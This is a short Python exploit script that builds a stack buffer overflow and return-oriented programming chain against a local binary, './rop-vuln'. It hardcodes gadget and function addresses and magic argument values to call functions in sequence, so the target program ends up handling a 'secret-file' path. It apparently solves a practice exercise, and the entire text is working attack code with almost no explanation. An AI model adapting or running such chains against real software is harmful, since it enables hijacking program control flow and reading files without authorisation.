import os
import struct

food = 0x80484fe 
pop_ret = 0x0804855d

feeling_sick = 0x804855f 
pop_pop_pop_ret = 0x0804855b
filename = 0xbffff28b

lazy = 0x80484cb

# PAYLOAD
# [AA..AAA][food][pop_ret][0xdeadbeef][feeling_sick][pop_pop_ret][0xd15ea5e][0x0badf00d][lazy]

p1 = "A"*112

p1 += struct.pack("I",food)
p1 += struct.pack("I",pop_ret)
p1 += struct.pack("I",0xdeadbeef)

p1 += struct.pack("I",feeling_sick)
p1 += struct.pack("I",pop_pop_pop_ret)
p1 += struct.pack("I",0xd15ea5e)
p1 += struct.pack("I",0x0badf00d)
p1 += struct.pack("I",filename)

p1 += struct.pack("I",lazy)


p2 = "B"*50
p2 += "secret-file"

os.system("./rop-vuln %s %s" % (p1,p2))

